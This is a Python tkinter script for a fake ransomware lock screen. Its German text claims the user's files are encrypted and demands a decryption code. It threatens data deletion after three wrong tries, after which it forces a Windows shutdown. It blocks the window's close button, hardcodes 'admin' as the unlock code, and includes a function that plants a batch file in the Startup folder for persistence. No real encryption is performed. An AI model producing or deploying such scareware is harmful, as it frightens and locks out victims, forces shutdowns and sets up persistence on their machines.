from cgi import test
from cgitb import text
from distutils import command
from email.mime import image
from fileinput import filename
import imp
from ast import If
from msilib.schema import File
from multiprocessing import parent_process
from sre_parse import expand_template
from statistics import mode
import string
from tkinter import *
import tkinter as tk
from tkinter import ttk as ttk
from tkinter.ttk import Progressbar
from tokenize import String
import os
from turtle import color, left, position, right, width
from PIL import ImageTk, Image
import getpass
import time
USER_NAME = getpass.getuser()



hiddenpasswd = 'admin'
count = 3

mainWin = tk.Tk()
mainWin.overrideredirect(1)
mainWin.geometry('1250x1100')
mainWin.configure(bg='black')

#mainWin.geometry('625x610')


img = PhotoImage(file = "pic.png")


result = StringVar()
result.set('Daten wurden verschlüsselt. Code zum Entschlüsseln eingeben')
label_1 = tk.Label(mainWin, bg='black', fg='red', image=img, textvariable=result, compound=TOP)
label_1.grid()
label_1.focus()



password = StringVar()
entry_1 = tk.Entry(mainWin, textvariable=password, width=20, show='*')
entry_1.grid()
entry_1.focus()





def clicked(): 
    global count
    count = count - 1
    label1.configure(text=f'Verbleibende Versuche bevor Datenlöschung: {count}')

    if (count == 0):
        os.system("shutdown /s /t 1")





def check_passwd():
    passwd = entry_1.get()
    if (passwd == 'admin'):
        mainWin.destroy()



def on_closing():
    print('Lol u cant close me')
    pass


def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath('C:\test\screenlockwithpasswd.py'))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)




label1 = tk.Label(mainWin, bg='black', fg='red')
label1.grid()

schaltf1 = tk.Button(mainWin, text="Entschlüsseln", command=lambda:[check_passwd(), clicked()], bg='black', fg='red')
schaltf1.grid()


bar = ttk.Progressbar(mainWin, orient="horizontal", mode='determinate', maximum=100, value=0)
label_bar = tk.Label(mainWin, text="Vorbereitung zur Datenlöschung", bg='black', fg='red')
label_bar.grid()
bar.grid()

bar.start()
bar.step(5)


mainWin.protocol("WM_DELETE_WINDOW", on_closing)
mainWin.mainloop()


